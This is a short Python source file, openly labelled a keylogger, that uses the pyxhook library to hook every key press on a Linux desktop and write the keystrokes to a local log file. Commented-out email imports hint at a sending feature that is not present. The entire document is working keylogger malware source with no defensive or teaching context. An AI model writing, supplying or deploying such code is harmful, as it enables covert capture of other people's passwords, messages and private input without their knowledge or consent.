# Python code for keylogger
import os
import pyxhook
# import smtplib
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText


log_file = open('log.txt', 'w') # Open log file in write mode


def OnKeyPress(event):
    if event.Key == 'Return':
        log_file.write('\n')    
    elif event.Key == 'BackSpace':
        log_file.write('\b')
    elif event.Key == 'Tab':
        log_file.write('\t')
    elif event.Key == 'Escape':
        log_file.write('\033')
    elif event.Key == 'Enter':
        log_file.write('\n')
    elif event.Key == 'space':
        log_file.write(' ')
    elif event.Key == 'comma':
        log_file.write(',')
    elif event.Key == 'period':
        log_file.write('.')
    elif event.Key == 'slash':
        log_file.write('/')
    elif event.Key == 'backslash':
        log_file.write('\\')
    elif event.Key == 'semicolon':
        log_file.write(';')
    elif event.Key == 'apostrophe':
        log_file.write("'")
    elif event.Key == 'bracketleft':
        log_file.write('[')
    elif event.Key == 'bracketright':
        log_file.write(']')
    elif event.Key == 'minus':
        log_file.write('-')
    elif event.Key == 'equal':
        log_file.write('=')
    elif event.Key == 'plus':
        log_file.write('+')
    elif event.Key == 'at':
        log_file.write('@')
    elif event.Key == 'underscore':
        log_file.write('_')
    elif event.Key == 'dollar':
        log_file.write('$')
    elif event.Key == 'exclamation':
        log_file.write('!')
    elif event.Key == 'question':
        log_file.write('?')
    elif event.Key == 'asciicircum':
        log_file.write('^')
    elif event.Key == 'hash':
        log_file.write('#')
    elif event.Key == 'Shift_L':
        log_file.write('')
    elif event.Key == 'Shift_R':
        log_file.write('')
    elif event.Key == 'Caps_Lock':
        log_file.write('Cap->')
    else:
        log_file.write(event.Key)
        log_file.flush()


# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start()# start the hook
except KeyboardInterrupt:
    pass